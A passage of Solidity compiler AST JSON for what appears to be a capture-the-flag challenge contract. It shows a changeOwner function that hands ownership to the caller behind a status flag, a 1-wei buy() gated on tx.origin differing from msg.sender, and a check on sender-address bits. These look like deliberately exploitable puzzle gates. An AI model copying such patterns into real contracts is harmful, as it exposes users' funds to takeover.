																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1241,
																"src": "4000:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 340,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "4000:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "IndexAccess",
														"src": "3993:18:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "74727565",
														"id": 342,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "4015:4:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"src": "3993:26:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 357,
												"nodeType": "IfStatement",
												"src": "3989:119:0",
												"trueBody": {
													"id": 356,
													"nodeType": "Block",
													"src": "4021:87:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 349,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 344,
																		"name": "status",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 161,
																		"src": "4036:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_mapping$_t_address_$_t_bool_$",
																			"typeString": "mapping(address => bool)"
																		}
																	},
																	"id": 347,
																	"indexExpression": {
																		"argumentTypes": null,
																		"expression": {
																			"argumentTypes": null,
																			"id": 345,
																			"name": "msg",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1241,
																			"src": "4043:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_message",
																				"typeString": "msg"
																			}
																		},
																		"id": 346,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sender",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "4043:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "4036:18:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "66616c7365",
																	"id": 348,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "bool",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "4057:5:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"value": "false"
																},
																"src": "4036:26:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"id": 350,
															"nodeType": "ExpressionStatement",
															"src": "4036:26:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 354,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 351,
																	"name": "_owner",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 14,
																	"src": "4077:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 352,
																		"name": "msg",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1241,
																		"src": "4086:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_message",
																			"typeString": "msg"
																		}
																	},
																	"id": 353,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "sender",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "4086:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																},
																"src": "4077:19:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"id": 355,
															"nodeType": "ExpressionStatement",
															"src": "4077:19:0"
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"id": 359,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "changeOwner",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 317,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3870:2:0"
									},
									"returnParameters": {
										"id": 318,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3880:0:0"
									},
									"scope": 544,
									"src": "3850:265:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 419,
										"nodeType": "Block",
										"src": "4176:341:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 367,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 365,
																"name": "_owner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 14,
																"src": "4195:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "307832323038363642314132323139663430653732663563363238423635443534323638634133413944",
																"id": 366,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4205:42:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																},
																"value": "0x220866B1A2219f40e72f5c628B65D54268cA3A9D"
															},
															"src": "4195:52:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 364,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1244,
														"src": "4187:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 368,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4187:61:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 369,
												"nodeType": "ExpressionStatement",
												"src": "4187:61:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															"id": 375,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 371,
																	"name": "tx",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1253,
																	"src": "4267:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_transaction",
																		"typeString": "tx"
																	}
																},
																"id": 372,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "origin",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "4267:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 373,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1241,
																	"src": "4280:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 374,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "4280:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"src": "4267:23:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 370,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1244,
														"src": "4259:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 376,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4259:32:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 377,
												"nodeType": "ExpressionStatement",
												"src": "4259:32:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 384,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 379,
																	"name": "Times",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 165,
																	"src": "4310:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 382,
																"indexExpression": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 380,
																		"name": "msg",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1241,
																		"src": "4316:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_message",
																			"typeString": "msg"
																		}
																	},
																	"id": 381,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "sender",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "4316:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "4310:17:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 383,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4331:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "4310:22:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 378,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1244,
														"src": "4302:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 385,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4302:31:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 386,
												"nodeType": "ExpressionStatement",
												"src": "4302:31:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 393,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 388,
																	"name": "_balances",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 600,
																	"src": "4352:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 391,
																"indexExpression": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 389,
																		"name": "msg",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1241,
																		"src": "4362:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_message",
																			"typeString": "msg"
																		}
																	},
																	"id": 390,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "sender",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "4362:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "4352:21:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 392,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4377:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "4352:26:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 387,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1244,
														"src": "4344:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 394,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4344:35:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 395,
												"nodeType": "ExpressionStatement",
												"src": "4344:35:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 400,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 397,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1241,
																	"src": "4398:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 398,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "4398:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "31",
																"id": 399,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4411:5:0",
																"subdenomination": "wei",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_1_by_1",
																	"typeString": "int_const 1"
																},
																"value": "1"
															},
															"src": "4398:18:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 396,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1244,
														"src": "4390:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 401,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4390:27:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 402,
												"nodeType": "ExpressionStatement",
												"src": "4390:27:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 408,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 403,
															"name": "_balances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 600,
															"src": "4428:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 406,
														"indexExpression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 404,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1241,
																"src": "4438:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 405,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "4438:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "4428:21:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "313030",
														"id": 407,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "4452:3:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_100_by_1",
															"typeString": "int_const 100"
														},
														"value": "100"
													},
													"src": "4428:27:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 409,
												"nodeType": "ExpressionStatement",
												"src": "4428:27:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 415,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 410,
															"name": "Times",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 165,
															"src": "4466:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 413,
														"indexExpression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 411,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1241,
																"src": "4472:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 412,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "4472:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "4466:17:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 414,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "4486:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "4466:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 416,
												"nodeType": "ExpressionStatement",
												"src": "4466:21:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 417,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "4505:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 363,
												"id": 418,
												"nodeType": "Return",
												"src": "4498:11:0"
											}
										]
									},
									"documentation": null,
									"id": 420,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "buy",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 360,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "4135:2:0"
									},
									"returnParameters": {
										"id": 363,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 362,
												"name": "success",
												"nodeType": "VariableDeclaration",
												"scope": 420,
												"src": "4162:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 361,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "4162:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4161:14:0"
									},
									"scope": 544,
									"src": "4123:394:0",
									"stateMutability": "payable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 501,
										"nodeType": "Block",
										"src": "4586:396:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 430,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 428,
																"name": "_amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 422,
																"src": "4605:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "323030",
																"id": 429,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4616:3:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_200_by_1",
																	"typeString": "int_const 200"
																},
																"value": "200"
															},
															"src": "4605:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 427,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1244,
														"src": "4597:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 431,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4597:23:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 432,
												"nodeType": "ExpressionStatement",
												"src": "4597:23:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 441,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 439,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"expression": {
																				"argumentTypes": null,
																				"id": 435,
																				"name": "msg",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1241,
																				"src": "4644:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_magic_message",
																					"typeString": "msg"
																				}
																			},
																			"id": 436,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "sender",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": null,
																			"src": "4644:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address_payable",
																				"typeString": "address payable"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address_payable",
																				"typeString": "address payable"
																			}
																		],
																		"id": 434,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "4639:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		},
																		"typeName": "uint"
																	},
																	"id": 437,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "4639:16:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "&",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "307866666666",
																	"id": 438,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "4658:6:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_65535_by_1",
																		"typeString": "int_const 65535"
																	},
																	"value": "0xffff"
																},
																"src": "4639:25:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "307866666666",
																"id": 440,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4668:6:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_65535_by_1",
																	"typeString": "int_const 65535"
																},
																"value": "0xffff"
															},
															"src": "4639:35:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 433,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1244,
														"src": "4631:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 442,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4631:44:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
